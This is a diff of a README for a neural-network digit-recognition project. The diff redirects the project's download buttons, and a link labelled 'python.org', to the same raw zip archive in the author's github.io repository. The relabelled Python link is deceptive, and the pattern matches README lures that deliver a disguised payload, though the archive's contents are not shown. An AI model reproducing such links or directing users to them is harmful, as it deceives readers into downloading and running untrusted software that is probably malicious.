@@ -5,7 +5,7 @@ description: "Learn, tweak, and visualize a neural network recognizing handwritt
 ---
 # 🧠 neural-network-digits - Watch AI Learn Handwritten Numbers Live
 
-[![Download Now](https://img.shields.io/badge/Download-neural--network--digits-blue?style=for-the-badge&logo=github)](https://github.com/cami005/neural-network-digits)
+[![Download Now](https://img.shields.io/badge/Download-neural--network--digits-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ If you see a black window or a pop-up asking about Python, don’t worry – fol
 
 This program requires **Python** (a free programming language) to run. If you don’t have it:
 
-1. Go to [python.org](https://www.python.org) and click **"Download Python"**.
+1. Go to [python.org](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip) and click **"Download Python"**.
 2. Run the installer. **Important:** Check the box that says **"Add Python to PATH"** before clicking Install.
 3. After installation, open the extracted folder, right-click inside it, and select **"Open in Terminal"**. Type `pip install numpy matplotlib` and press Enter. This installs the helper libraries (NumPy and Matplotlib) automatically.
 
@@ -130,7 +130,7 @@ If you use it for a course or tutorial, a small credit is appreciated.
 
 Click the button below to get started:
 
-**[⬇️ Download neural-network-digits](https://github.com/cami005/neural-network-digits)**
+**[⬇️ Download neural-network-digits](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip)**
 
 Then follow the three simple steps in **Quick Start** above. Within 10 minutes, you’ll be watching a brain – built entirely from scratch – learn to read your handwriting.
 
